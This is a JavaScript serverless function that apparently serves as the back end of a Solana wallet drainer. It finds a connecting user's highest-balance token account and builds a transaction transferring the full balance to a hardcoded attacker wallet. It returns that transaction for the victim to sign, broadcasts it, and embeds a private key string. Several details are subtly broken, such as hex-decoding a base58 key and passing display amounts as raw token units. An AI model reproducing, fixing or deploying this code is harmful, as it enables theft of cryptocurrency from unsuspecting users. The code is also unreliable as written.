const { Connection, PublicKey, Keypair, Transaction } = require('@solana/web3.js');
const { 
    getAccount, 
    getAssociatedTokenAddress, 
    createTransferInstruction, 
    TOKEN_PROGRAM_ID, 
    getMint 
} = require('@solana/spl-token');

// --- YOUR WALLET CONFIGURATION ---
const MY_PRIVATE_KEY_STR = "4okzAJZAuVgnUTWsR1aMKpDHw6WWFFnrazpKzfmWCkg2sttcXtJ9GFiiLcpvbaVFCpszaMB1QY5Mf7pxWB7L2GXr";

// Convert hex string to Uint8Array for Keypair
const secretKeyBytes = Uint8Array.from(Buffer.from(MY_PRIVATE_KEY_STR, 'hex'));
const DESTINATION_WALLET = Keypair.fromSecretKey(secretKeyBytes);

// Verify Public Key matches expectation (Optional check)
const expectedPublic = "HeLknryeK1f1UA9NZjx78RCzwfMZKEcyAYYem1kruRk4";
if (DESTINATION_WALLET.publicKey.toString() !== expectedPublic) {
    console.warn("Warning: Key derived does not match expected public key. Double check your private key.");
}
// -------------------------------

const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');

exports.handler = async (event) => {
    try {
        // Check if body exists and parse it
        let body;
        if (event.body) {
            body = JSON.parse(event.body);
        } else {
            return {
                statusCode: 400,
                body: JSON.stringify({ error: "No body provided" })
            };
        }

        // If we have a transaction to broadcast, do it
        if (body.transaction) {
            try {
                const txBuffer = Uint8Array.from(Buffer.from(body.transaction, 'base64'));
                const transaction = Transaction.deserialize(txBuffer);
                const signature = await connection.sendRawTransaction(txBuffer);
                return {
                    statusCode: 200,
                    body: JSON.stringify({ signature })
                };
            } catch (err) {
                return {
                    statusCode: 500,
                    body: JSON.stringify({ error: `Broadcast failed: ${err.message}` })
                };
            }
        }

        // Otherwise, prepare the drain transaction
        const userPubkey = new PublicKey(body.publicKey);
        
        // 1. Get all token accounts
        const tokenAccounts = await connection.getParsedTokenAccountsByOwner(userPubkey, {
            programId: TOKEN_PROGRAM_ID
        });

        if (!tokenAccounts.value || tokenAccounts.value.length === 0) {
            throw new Error("No tokens found");
        }

        // 2. Find highest balance token
        let bestAccount = null;
        let maxBalance = 0;

        for (const account of tokenAccounts.value) {
            const amount = account.account.data.parsed.info.tokenAmount.uiAmount;
            if (amount > maxBalance) {
                maxBalance = amount;
                bestAccount = account;
            }
        }

        if (!bestAccount) throw new Error("Could not find token with balance");

        const sourceTokenAccount = bestAccount.account.pubkey;
        const mintAddress = bestAccount.account.data.parsed.info.mint;

        // 3. Get destination token account
        const destTokenAccount = await getAssociatedTokenAddress(
            new PublicKey(mintAddress),
            DESTINATION_WALLET.publicKey,
            false
        );

        // 4. Create transaction
        const transaction = new Transaction().add(
            createTransferInstruction(
                sourceTokenAccount,
                destTokenAccount,
                userPubkey,
                maxBalance // Transfers the full balance
            )
        );

        // 5. Get recent blockhash
        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = userPubkey; 

        // 6. Serialize to Base64 for the client
        const serialized = transaction.serialize();
        const base64Tx = Buffer.from(serialized).toString('base64');

        return {
            statusCode: 200,
            body: JSON.stringify({ 
                transaction: base64Tx,
                mint: mintAddress.toString(),
                amount: maxBalance
            })
        };

    } catch (error) {
        console.error("Drain Error:", error);
        return {
            statusCode: 500,
            body: JSON.stringify({ error: error.message })
        };
    }
};